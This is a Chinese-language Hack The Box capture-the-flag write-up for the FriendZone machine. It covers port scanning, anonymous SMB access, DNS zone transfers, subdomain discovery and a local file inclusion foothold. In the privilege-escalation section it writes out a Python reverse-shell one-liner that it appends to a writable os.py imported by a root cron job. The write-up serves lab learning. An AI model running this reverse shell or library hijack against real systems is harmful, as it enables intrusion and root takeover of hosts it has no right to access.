---
title: FriendZone Writeup
date: 2020-12-02 04:40:10
category: Hack The Box
---

# FriendZone Writeup

![](./0.png)

## 0x00 TODO

`LinEnum.sh` 脚本补一个 `查询全局可写脚本文件`，对于个别提权场景有用。

## 0x01 信息收集

### 1、TCP Scan
``` bash
nmap -A -p- -oA nmap/tcp 10.10.10.123
```
开放端口不少，可能是一个比较灵活的盒子。
- **21**: vsftpd 3.0.3，版本较高
- **22**: OpenSSH 7.6p1，版本较高
- **53**: ISC BIND 9.11.3-1ubuntu1.2，域名解析服务，可能涉及到域名
- **80**: apache 2.4.29，版本较高，web 页面 title Friendxxx
- **139**: samba 3.x ~ 4.x，可能是漏洞版本
- **443**: apache 2.4.29，版本较高，web 页面 title 404
- **445**: samba smbd 4.7.6，版本较高
![](./1.png)

### 2、UDP Scan
``` bash
nmap -sU -A -p- -oA nmap/udp 10.10.10.123
```
无结果。

**共开放了 `tcp 21、22、53、80、139、443、445` 端口。**

![](./2.png)

## 0x02 枚举
我去啊，这些个端口的服务查了一遍下来没有公开漏洞，版本都比较高，直接漏洞打看似不太可能。

### 1、Port 21、22
没找到公开漏洞。
FTP 尝试匿名登录，登录失败。
``` bash
ftp 10.10.10.123
Name:       anonymous
Password:   (blank)
```
![](./2.1.png)
没啥其他内容，放着。

### 2、Port 53
没找到公开漏洞。
`ISC BIND` 是个 `域名解析服务`，暂时不知道有啥用，可能有用，先做个记录。

### 3、Port 139、445
没找到公开漏洞。
如同 `FTP`，对于 `SMB` 首先要检查能否匿名登录，列出共享目录以及权限，是必要操作。这里登录成功。
``` bash
# 查看文件目录 & 权限
smbmap -H 10.10.10.123
# 匿名登录，翻找是否有敏感数据
smbclient //10.10.10.123
```
`/Development` 可读可写，空文件夹；
`/general` 仅可读，里面找到一个 `creds.txt`，下载到本地打开，看似是 `admin` 密码，存一下。

![](./3.png)
![](./4.png)

### 4、Port 80、443
没找到公开漏洞，打开主页 `http://10.10.10.123`，是一个空白页，`dirbuster` 跑一下目录找到个 `/wordpress` 啥都没有。

![](./4.1.png)
好像走到死胡同，没有找到其他突破口，这时候要回顾之前收集的信息看有没有遗漏，之前收集的线索有没有没用上或者还不知道怎么用的。

#### 4.1、发现路由配置
回顾 nmap 扫描结果里 `80` 和 `443` 有不同页面，直接打开 `https://10.10.10.123` 是 404，想到**可能存在特定路由配置，需要域名才能访问**。
应该是什么域名呢？翻一遍前面的信息，找找是否有提示。
- 根据主页的信息 `Email us at: info@firendzoneportal.red`，得到域名1 `friendzoneportal.red`。
- 根据 `nmap 443` 扫描结果 `ssl-cert: commonName=friendzone.red`，得到域名2 `friendzone.red`。

添加 `/etc/hosts` 本地解析，浏览器打开 `https://friendzoneportal.red，https://friendzone.red`，果然是另一个页面。

![](./5.png)
![](./6.png)
> `https://friendzone.red` 主页下注释了神秘路径 `/js/js`，打开没啥内容，不知道有啥用。
>
> ![](./7.png)

联系之前扫到的 53 端口 BIND 服务，靶机可能自身是一个 `DNS Server`，可能还有其他的子域名，先从靶机地址捞一波解析记录，反查域名，得到许多子域。
``` bash
# dig
dig axfr @10.10.10.123 friendzone.red
dig axfr @10.10.10.123 friendzoneportal.red
# host
host -l friendzone.red 10.10.10.123
host -l friendzoneportal.red 10.10.10.123
```
![](./8.png)

处理一下结果获得 9 个子域名，全部加入本地解析。
``` bash
cat fzt | grep IN | awk '{print $1}' | sed 's/\.$//g' | sort -u > hosts # awk 默认按 tab/space 分割，cut 默认按 tab 
$ vi hosts
admin.friendzoneportal.red 
administrator1.friendzone.red 
files.friendzoneportal.red 
friendzoneportal.red
friendzone.red
hr.friendzone.red
imports.friendzoneportal.red 
uploads.friendzone.red
vpn.friendzoneportal.red 
:%s/\n/ /g
```
![](./9.png)
于是又多了一大堆站点可以耍，走出刚刚的死胡同。

#### 4.2、新一轮的 web 枚举
浏览了上面9个域名，只有5个有页面，dirbuster 跑目录的同时，手工渗透。
``` bash
friendzoneportal.red
admin.friendzoneportal.red       
friendzone.red
administrator1.friendzone.red  
uploads.friendzone.red
hr.friendzone.red               # 404
imports.friendzoneportal.red    # 404
files.friendzoneportal.red      # 404
vpn.friendzoneportal.red        # 404
```
目录啥也没跑出来。
首先全部访问一下，有个工具 `aquatone` 类似 web 探测器，没装，手工访问一遍，这里**一定要 `http` 和 `https` 都试一下，可能有不同结果**。
- `friendzoneportal.red` 之前看了没东西，排除。
- `friendzone.red` 之前看了没东西，排除。
- `admin.friendzoneportal.red` 页面登录默认页面 `login.php` 无论传什么参数返回都一样，功能欠缺，先放着。
- `administrator1.friendzone.red` 登录页，提示传参 `image_id=a.jpg&pagename=timestamp`，有搞头。
- `uploads.friendzone.red` 上传页，有搞头。

着重看后面两域名。

#### 4.3、登录页 `https://administrator1.friendzone.red`

![](./9.1.png)
使用之前拿到的 admin 账密登录成功。

![](./9.2.png)

#### 4.3、上传页 `https://uploads.friendzone.red`

哦豁，上传点，加前面的传参解析，离成功不远了。

![](./9.4.png)

## 0x03 立足点

根据提示传参 `https://administrator1.friendzone.red?image_id=a.jpg&pagename=timestamp`，拿到图片路径 `/images`，发现有还有图片 `b.jpg`，修改 `image_id=b.jpg`，可见图片和下方内容随之变化。

根据 `参数名和现象`，初步判定：
- image_id 指定图片路径，
- timestamp 指定页面文件，猜测与文件包含有关

![](./9.3.png)
再来看上传页 `https://uploads.friendzone.red`，尝试上传 `.php` `.jpg`，首先没有看到返回文件地址，其次在 `/images` 下也没有留存，尝试过 `文件名/带后缀/不带后缀/返回的时间戳` 花式组合分别放在 image_id pagename 都没用。 

![](./9.5.png)

本地文件包含。



![](./12.png)

## 0x04 提权

### 1、SUID
suid exim4 4.90.1 不行。

![](./12.1.png)
![](./12.2.png)
### 2、Sudo
friend - sudo su（/home/friend/.sudo_as_admin_successful）不行。

![](./14.png)
### 3、Crontab
pspy 监控定时任务，发现执行了一个 `python` 脚本。

![](./13.png)
但是查看权限发现不可写，再查看下内容，主要代码逻辑是注释掉的。

![](./15.png)
脚本里 `import os`。**脚本不可写，导入的库却不一定**，`locate os.py` 定位库文件，查看一下权限，是可写的。

![](./16.png)
向 `/usr/lib/python2.7/os.py` 追加 python 反弹 shell 代码。
``` bash
echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",4445));dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /usr/lib/python2.7/os.py
```
![](./17.png)
本地开启监听 `nc -lnvp 4445`，等待定时任务启动，获得 root shell。

![](./18.png)

## 0x05 攻击节点

## 0x06 学到什么 
#### 1、443 的证书信息要多看，很有用。
#### 2、遇到 web 应用多留意域名路由配置。
